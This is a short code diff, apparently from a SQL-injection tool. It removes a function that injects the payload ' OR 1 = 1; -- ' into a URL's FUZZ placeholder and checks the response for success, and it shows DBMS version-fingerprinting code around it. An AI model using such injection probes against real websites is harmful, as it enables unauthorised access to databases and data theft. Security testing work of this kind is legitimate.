@@ -28,22 +28,6 @@ class DBMS_VERSION_STRING(Enum):
     SQLSERVER = 'SELECT @@VERSION()'
 
 
-def is_injectable(url, success_str, error_str):
-    target = url.replace("FUZZ", "' OR 1 = 1; -- ")
-    response = request("get", target)
-    response = response.text
-
-    if response is None:
-        return State.Error
-
-    if success_str in response and error_str in response:
-        return State.Ambiguous
-    elif success_str in response:
-        return State.Success
-    else:
-        return State.Error
-
-
 def determine_dbms(opts, poison, columns=1, brute_force=False):
     sql_version = None
     brute_force_limit = 20
